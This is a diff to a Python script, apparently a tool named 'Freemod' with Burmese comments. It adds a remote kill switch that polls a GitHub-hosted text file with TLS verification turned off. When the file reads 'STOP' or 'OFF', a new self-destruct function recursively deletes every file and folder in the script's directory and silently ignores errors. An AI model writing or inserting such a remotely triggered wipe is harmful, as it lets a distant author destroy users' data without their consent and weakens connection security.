@@ -1,6 +1,11 @@
 import os
 import sys
 import subprocess
+import time
+import shutil
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ══════════════════════════════════════════════════════════
 # ၁။ လိုအပ်သော Library များကို အလိုအလျောက်စစ်ဆေးပြီး တင်ရန်
@@ -20,27 +25,44 @@ for package in required_packages:
             sys.exit(1)
 
 import requests
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ══════════════════════════════════════════════════════════
-# ၂။ Remote Kill Switch လုံခြုံရေး စစ်ဆေးခြင်း
+# ၂။ Self-Destruct & Remote Kill Switch
 # ══════════════════════════════════════════════════════════
-KILL_SWITCH_URL = "https://raw.githubusercontent.com/Wzkffkhsih/Freemod/main/kill.txt"
+BASE_KILL_URL = "https://raw.githubusercontent.com/Wzkffkhsih/Freemod/main/kill.txt"
+
+def self_destruct_and_exit():
+    print(f"\n\033[1;31m[!] Access Revoked: အသုံးပြုခွင့် ရုပ်သိမ်းခံရသဖြင့် ဖိုင်များကို ဖျက်ဆီးနေပါသည်...\033[0m")
+    try:
+        # လက်ရှိ Freemod ဖိုဒါအတွင်းရှိ ဖိုင်များနှင့် ဖိုဒါများကို အစအနမကျန် ဖျက်မည်
+        current_dir = os.path.dirname(os.path.abspath(__file__))
+        for filename in os.listdir(current_dir):
+            file_path = os.path.join(current_dir, filename)
+            try:
+                if os.path.isfile(file_path) or os.path.islink(file_path):
+                    os.unlink(file_path)
+                elif os.path.isdir(file_path):
+                    shutil.rmtree(file_path)
+            except Exception:
+                pass
+    except Exception:
+        pass
+    sys.exit(0)
 
 def check_kill_switch():
     try:
-        r = requests.get(KILL_SWITCH_URL, timeout=5, verify=False)
+        # Cache မမိစေရန် timestamp ဖြင့် ချိတ်ဆက်ခြင်း
+        url = f"{BASE_KILL_URL}?t={int(time.time())}"
+        r = requests.get(url, timeout=5, verify=False)
         content = r.text.strip().upper()
+        
         if "STOP" in content or "OFF" in content:
-            print(f"\n\033[1;31m[!] Access Revoked: ဆော့ဖ်ဝဲအသုံးပြုခွင့်ကို ဆော့ဖ်ဝဲရေးသားသူမှ အဝေးမှ ပိတ်ထားလိုက်ပါပြီ။\033[0m")
-            sys.exit(0)
+            self_destruct_and_exit()
     except Exception:
-        # လိုင်းမကောင်းလျှင် သို့မဟုတ် ဆာဗာချိတ်ဆက်၍ မရလျှင် ဆက်လည်ပတ်ခွင့်ပြုရန် (သို့မဟုတ် လုံးဝပိတ်လိုပါက sys.exit(0) ထည့်နိုင်သည်)
+        # အင်တာနက်လိုင်း မရှိလျှင် သို့မဟုတ် ဆာဗာချိတ်ဆက်၍ မရလျှင် လုံခြုံရေးအရ ဖျက်ဆီးပစ်ရန် (သို့မဟုတ် ကျော်သွားရန်)
         pass
 
 if __name__ == "__main__":
-    # စတင်ဖွင့်လှစ်သည်နှင့် Kill Switch ကို အရင်စစ်မည်
     check_kill_switch()
     
     found = False
